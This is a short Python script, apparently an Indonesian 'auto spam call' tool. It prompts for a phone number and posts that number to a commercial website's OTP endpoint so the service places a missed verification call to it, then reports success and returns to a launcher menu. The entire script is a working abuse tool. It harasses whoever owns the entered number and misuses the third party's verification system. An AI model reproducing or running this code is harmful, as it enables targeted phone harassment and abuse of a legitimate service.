#_*_coding:utf-8_*_



#mampushhh bingung kan lo!!!
#sama gw juga bingung, gw ngoding cuman mengikuti naluri 

import requests, json, os, sys, random, time
#-------------------------------Warna---------------------------------------------------
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'

a = '\033[1;30m'
m = '\033[1;31m'
h = '\033[1;32m'
k = '\033[1;33m'
b = '\033[1;34m'
u = '\033[1;35m'
c = '\033[1;36m'
p = '\033[1;37m'
n = '\033[0m'

e = '\033[1;41m'

def logo():
  os.system('clear')
  print("""
%s╔═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╔═╗╔╦╗╦╔╗╔╔═╗  ╔═╗╔═╗╦
╠═╣║ ║ ║ ║ ║  ╚═╗╠═╝╠═╣║║║║║║║║ ╦  ║  ╠═╣║
╩ ╩╚═╝ ╩ ╚═╝  ╚═╝╩  ╩ ╩╩ ╩╩╝╚╝╚═╝  ╚═╝╩ ╩╩═╝
%s  %s***%s AUTHOR : ﾉ.ｱ.ﾑ.刀  ﾒ.ᄃ.の.り.乇%s ***  %s
%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"""%(b,e,p,h,p,n,p))

logo()
nom = input("%s[%s•%s]%s Nomor %s :%s "%(b,h,b,c,m,k))
print("%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"%(p))

def sukses(no1,pro,nam):
  print("%s[%s!%s]%s Succepssfully Sent The Message"%(b,h,b,h))
def gagal(no1,pro,nam):
  print("%s[%s!%s]%s Failed Sent The Message"%(b,m,b,m))

def sc():
  h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("3","call","nutriclub")
  else:
   gagal("3","call","nutriclub")

def back():
  print("%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"%(p))
  input("%s[%s!%s]%s Enter To Return Home.."%(b,h,b,m))
  os.system('python start.py')

def main():
  sc()
  back()

main()
